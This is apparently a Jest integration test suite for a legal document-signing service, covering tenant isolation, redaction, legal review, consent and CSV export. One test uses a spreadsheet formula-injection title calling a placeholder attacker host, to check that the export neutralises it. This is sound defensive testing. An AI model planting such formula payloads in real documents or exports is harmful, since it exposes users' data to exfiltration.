import crypto from 'node:crypto';
import jwt from 'jsonwebtoken';
import request from 'supertest';
import { PrismaClient } from '@prisma/client';
import { DocumentActor, DocumentService } from '../src/services/documentService';
import { EmailService } from '../src/services/emailService';
import { AuthService } from '../src/services/authService';
import { verifyAudit } from '../src/security/audit';

process.env.JWT_SECRET = 'jwt-secret-long-enough-for-workflow-tests';
process.env.AUDIT_SIGNING_KEY = 'audit-secret-long-enough-for-workflow-tests';
process.env.AUDIT_SIGNING_KEY_ID = 'test-key-1';
process.env.MFA_ENCRYPTION_KEY = 'mfa-encryption-key-long-enough-for-tests';
process.env.FRONTEND_URL = 'http://localhost:3000';
process.env.S3_BUCKET = 'test-bucket';
process.env.AWS_ACCESS_KEY_ID = 'test';
process.env.AWS_SECRET_ACCESS_KEY = 'test';
process.env.AWS_REGION = 'us-east-1';
process.env.MALWARE_SCANNER_URL = 'http://scanner.invalid/scan';

const prisma = new PrismaClient();
const pdf = (text: string) => Buffer.from(`%PDF-1.4\n${text}\n%%EOF`);
const file = (name: string, body: Buffer): Express.Multer.File => ({ fieldname: 'file', originalname: name, encoding: '7bit', mimetype: 'application/pdf', size: body.length, destination: '', filename: name, path: '', buffer: body, stream: null as any });
const actor = (user: { id: string; organizationId: string; role: any }, privileged = false): DocumentActor => ({ id: user.id, organizationId: user.organizationId, role: user.role, privileged });

class MemoryStorage {
  objects = new Map<string, Buffer>();
  deleted: string[] = [];
  async upload(body: Buffer, input: { key: string }) { this.objects.set(input.key, body); return { key: input.key, versionId: crypto.randomUUID(), checksum: crypto.createHash('sha256').update(body).digest('hex') }; }
  async download(key: string) { const body = this.objects.get(key); if (!body) throw new Error('missing object'); return { body, checksum: crypto.createHash('sha256').update(body).digest('hex'), contentType: 'application/pdf' }; }
  async presignedDownload(key: string) { return `https://download.invalid/${encodeURIComponent(key)}`; }
  async deleteAllVersions(key: string) { this.deleted.push(key); this.objects.delete(key); return true; }
}

class ProviderStub {
  async call<T>(name: string) {
    if (name !== 'REDACTION') throw new Error(`Unexpected provider ${name}`);
    const raw = JSON.stringify({ redacted: true });
    return { data: { contentBase64: pdf('REDACTED CONTENT').toString('base64'), redactionManifest: { applied: 1 }, irreversible: true } as T, provider: 'redaction-test', providerVersion: '1.0.0', checksum: crypto.createHash('sha256').update(raw).digest('hex') };
  }
}

describe('governed document workflow', () => {
  const storage = new MemoryStorage();
  const service = new DocumentService(prisma, storage as any, new ProviderStub() as any);
  let orgA: any; let orgB: any; let owner: any; let counsel: any; let signer: any; let paralegal: any; let outsider: any; let matter: any;

  beforeAll(async () => {
    const suffix = crypto.randomUUID();
    orgA = await prisma.organization.create({ data: { name: 'Organization A', domain: `a-${suffix}.invalid` } });
    orgB = await prisma.organization.create({ data: { name: 'Organization B', domain: `b-${suffix}.invalid` } });
    const users = await Promise.all([
      prisma.user.create({ data: { email: `owner-${suffix}@example.invalid`, password: 'disabled', firstName: 'Owner', lastName: 'A', role: 'SENDER', organizationId: orgA.id, isEmailVerified: true } }),
      prisma.user.create({ data: { email: `counsel-${suffix}@example.invalid`, password: 'disabled', firstName: 'Counsel', lastName: 'A', role: 'SENDER', organizationId: orgA.id, isEmailVerified: true } }),
      prisma.user.create({ data: { email: `signer-${suffix}@example.invalid`, password: 'disabled', firstName: 'Signer', lastName: 'A', role: 'SIGNER', organizationId: orgA.id, isEmailVerified: true } }),
      prisma.user.create({ data: { email: `paralegal-${suffix}@example.invalid`, password: 'disabled', firstName: 'Para', lastName: 'A', role: 'VIEWER', organizationId: orgA.id, isEmailVerified: true } }),
      prisma.user.create({ data: { email: `outsider-${suffix}@example.invalid`, password: 'disabled', firstName: 'Out', lastName: 'B', role: 'SENDER', organizationId: orgB.id, isEmailVerified: true } }),
    ]);
    [owner, counsel, signer, paralegal, outsider] = users;
    matter = await prisma.matter.create({ data: { organizationId: orgA.id, name: 'Matter A', reference: `MAT-${suffix}`, jurisdiction: 'NY-US', retentionUntil: new Date(Date.now() + 86_400_000), createdById: owner.id } });
    await prisma.matterMember.createMany({ data: [{ matterId: matter.id, userId: owner.id, role: 'OWNER' }, { matterId: matter.id, userId: counsel.id, role: 'COUNSEL' }, { matterId: matter.id, userId: paralegal.id, role: 'PARALEGAL' }] });
  });

  afterAll(async () => { await prisma.$disconnect(); });

  test('redacts irreversibly, detects version conflicts, and denies cross-tenant/revoked access', async () => {
    const document = await service.upload(file('secret.pdf', pdf('SECRET-123')), actor(owner), { matterId: matter.id, title: '=WEBSERVICE("https://attacker.invalid")', jurisdiction: 'NY-US', effectiveDate: new Date('2026-07-19') });
    await expect(service.get(document.id, actor(outsider))).rejects.toMatchObject({ statusCode: 404 });
    await expect(service.get(document.id, actor(paralegal))).resolves.toMatchObject({ id: document.id });
    await prisma.matterMember.update({ where: { matterId_userId: { matterId: matter.id, userId: paralegal.id } }, data: { revokedAt: new Date() } });
    await expect(service.get(document.id, actor(paralegal))).rejects.toMatchObject({ statusCode: 403, message: 'MATTER_ACCESS_REVOKED' });

    const redacted = await service.redact(document.id, actor(owner), 1, [{ page: 1, x: 20, y: 20, width: 100, height: 20, reason: 'Client account number' }]);
    expect(redacted.version).toBe(2);
    expect(storage.objects.get(redacted.storageKey)?.toString()).not.toContain('SECRET-123');
    await expect(service.addVersion(document.id, file('conflict.pdf', pdf('NEW VERSION')), actor(owner), 1)).rejects.toMatchObject({ statusCode: 409, message: 'DOCUMENT_VERSION_CONFLICT' });
    expect(storage.deleted.length).toBeGreaterThan(0);
  });

  test('requires independent legal review and records signer-delivery failure', async () => {
    const document = await service.upload(file('delivery.pdf', pdf('DELIVERY TEST')), actor(owner), { matterId: matter.id, title: 'Delivery contract', jurisdiction: 'NY-US', effectiveDate: new Date('2026-07-19') });
    await expect(service.legalReview(document.id, actor(owner), { decision: 'APPROVED', jurisdiction: 'NY-US', effectiveDate: new Date('2026-07-19'), rationale: 'Owner cannot independently approve this document.' })).rejects.toMatchObject({ statusCode: 403 });
    await service.legalReview(document.id, actor(counsel), { decision: 'APPROVED', jurisdiction: 'NY-US', effectiveDate: new Date('2026-07-19'), rationale: 'Reviewed current language and jurisdictional requirements.' });
    jest.spyOn(EmailService, 'sendSignatureRequest').mockRejectedValueOnce(new Error('SMTP_UNAVAILABLE'));
    await expect(service.send(document.id, [{ email: signer.email, name: 'Signer A' }], actor(owner))).rejects.toMatchObject({ statusCode: 502 });
    await expect(prisma.signature.findFirstOrThrow({ where: { documentId: document.id } })).resolves.toMatchObject({ status: 'DELIVERY_FAILED', failureReason: 'SMTP_UNAVAILABLE' });
  });

  test('captures explicit consent, blocks double decisions, and enforces retention/hold gates', async () => {
    const document = await service.upload(file('sign.pdf', pdf('SIGN TEST')), actor(owner), { matterId: matter.id, title: 'Signing contract', jurisdiction: 'NY-US', effectiveDate: new Date('2026-07-19') });
    await service.legalReview(document.id, actor(counsel), { decision: 'APPROVED', jurisdiction: 'NY-US', effectiveDate: new Date('2026-07-19'), rationale: 'Reviewed this exact version for the configured jurisdiction.' });
    jest.spyOn(EmailService, 'sendSignatureRequest').mockResolvedValueOnce();
    await service.send(document.id, [{ email: signer.email, name: 'Signer A' }], actor(owner));
    const consent = { agreed: true, text: 'I agree to use an electronic signature for this document.', timestamp: new Date().toISOString() };
    await expect(service.sign(document.id, actor(signer), { signatureData: 'data:image/png;base64,AAAA', consent })).resolves.toMatchObject({ status: 'SIGNED' });
    await expect(service.sign(document.id, actor(signer), { signatureData: 'data:image/png;base64,AAAA', consent })).rejects.toMatchObject({ statusCode: 409 });
    await expect(service.requestDeletion(document.id, actor(owner))).rejects.toMatchObject({ statusCode: 409, message: 'RETENTION_PERIOD_ACTIVE' });
    const hold = await service.placeHold(matter.id, actor(owner), 'CASE-123', 'Preserve records for active litigation.');
    expect((await prisma.document.findUniqueOrThrow({ where: { id: document.id } })).legalHoldActive).toBe(true);
    await service.releaseHold(hold.id, actor(owner), 'Litigation closed and release approved.');
  });

  test('accepts one-time matter invitations without creating a cross-tenant workspace', async () => {
    const rawToken = crypto.randomBytes(32).toString('base64url');
    const invitedEmail = `invited-${crypto.randomUUID()}@example.invalid`;
    const invitation = await prisma.matterInvitation.create({ data: { organizationId: orgA.id, matterId: matter.id, email: invitedEmail, role: 'COUNSEL', tokenHash: crypto.createHash('sha256').update(rawToken).digest('hex'), invitedById: owner.id, expiresAt: new Date(Date.now() + 3_600_000) } });
    const result = await AuthService.register({ email: invitedEmail, password: 'a-long-test-password', firstName: 'Invited', lastName: 'Counsel', invitationToken: rawToken }, { ipAddress: '127.0.0.1', userAgent: 'jest' });
    expect(result.user).toMatchObject({ organizationId: orgA.id, role: 'SENDER' });
    expect(await prisma.matterMember.findUnique({ where: { matterId_userId: { matterId: matter.id, userId: result.user.id } } })).toMatchObject({ role: 'COUNSEL', revokedAt: null });
    expect(await prisma.matterInvitation.findUniqueOrThrow({ where: { id: invitation.id } })).toMatchObject({ acceptedAt: expect.any(Date) });
  });

  test('exports only the authenticated tenant and neutralizes spreadsheet formulas', async () => {
    const sessionId = crypto.randomUUID();
    await prisma.userSession.create({ data: { sessionId, userId: owner.id, refreshTokenHash: 'unused', ipAddress: '127.0.0.1', userAgent: 'jest', lastSeenAt: new Date(), expiresAt: new Date(Date.now() + 3_600_000) } });
    const token = jwt.sign({ id: owner.id, organizationId: orgA.id, sid: sessionId, tokenVersion: owner.tokenVersion, privileged: false, type: 'access' }, process.env.JWT_SECRET!, { expiresIn: '15m', issuer: 'docusign-workflow-api', audience: 'docusign-workflow-client' });
    const { createApp } = await import('../src/app');
    const response = await request(createApp()).get('/api/documents/export/csv').set('Authorization', `Bearer ${token}`).expect(200);
    expect(response.text).toContain("'=WEBSERVICE");
    expect(response.text).not.toContain(outsider.email);
    const events = await prisma.auditLog.findMany({ where: { organizationId: orgA.id }, orderBy: [{ createdAt: 'asc' }, { id: 'asc' }] });
    expect(events.length).toBeGreaterThan(5);
    for (const event of events) expect(verifyAudit(event.eventHash, event.signature, process.env.AUDIT_SIGNING_KEY!)).toBe(true);
  });
});
